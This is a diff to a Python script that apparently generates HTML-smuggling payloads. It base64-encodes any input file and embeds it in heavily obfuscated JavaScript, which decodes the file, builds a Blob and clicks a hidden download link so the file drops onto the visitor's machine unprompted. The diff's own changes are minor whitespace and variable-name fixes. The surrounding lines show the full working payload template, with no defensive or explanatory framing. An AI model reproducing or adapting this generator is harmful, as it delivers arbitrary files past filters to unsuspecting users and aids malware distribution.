@@ -22,6 +22,7 @@ def random_sequences():
                 break
     return random_variable
 
+
 def arg(output_file):
     argv = sys.argv
     number = len(argv)
@@ -58,7 +59,8 @@ def arg(output_file):
         print("\tThe file not found!")
         print()
         sys.exit(0)
-        
+
+
 if __name__ == '__main__':
     output_file = "script.txt"
     try:
@@ -66,7 +68,7 @@ if __name__ == '__main__':
     except:
         sys.exit(0)
     try:
-        with open(file=file_path, mode = 'rb') as rb_file:
+        with open(file=file_path, mode='rb') as rb_file:
             file_bytes = rb_file.read()
         data_base64_bytes = base64.b64encode(file_bytes)
         del file_bytes, file_path
@@ -84,7 +86,7 @@ if __name__ == '__main__':
                        4] + """['push'](""" + random_variable[4] + """['shift']());}catch(""" + random_variable[6] + """){""" + random_variable[
                        4] + """['push'](""" + random_variable[4] + """['shift']());}}}(""" + random_variable[7] + """,0x291fa));function """ + \
                    random_variable[7] + """(){var """ + random_variable[
-                       8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + file_name + """','96643zAJuKG'];""" + \
+                       8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + filename + """','96643zAJuKG'];""" + \
                    random_variable[7] + """=function(){return """ + random_variable[8] + """;};return """ + random_variable[7] + """();}var """ + random_variable[
                        13] + """='""" + file_base64 + """',""" + random_variable[14] + """=window[""" + random_variable[0] + """(0x1bc)](""" + \
                    random_variable[13] + """),""" + random_variable[15] + """=new Uint8Array(""" + random_variable[14] + """[""" + random_variable[
@@ -110,7 +112,7 @@ if __name__ == '__main__':
                        17] + """[""" + random_variable[0] + """(0x1ad)](),window[""" + random_variable[0] + """(0x1ab)][""" + random_variable[
                        0] + """(0x1b2)](""" + random_variable[18] + """); </script>"""
         del filename, file_base64, random_variable
-        with open(file=outfile, encoding='utf-8', mode="w") as wfile:
+        with open(file=output_file, encoding='utf-8', mode="w") as wfile:
             wfile.write(template)
         print()
         print('\tScript File: "script.txt" ')
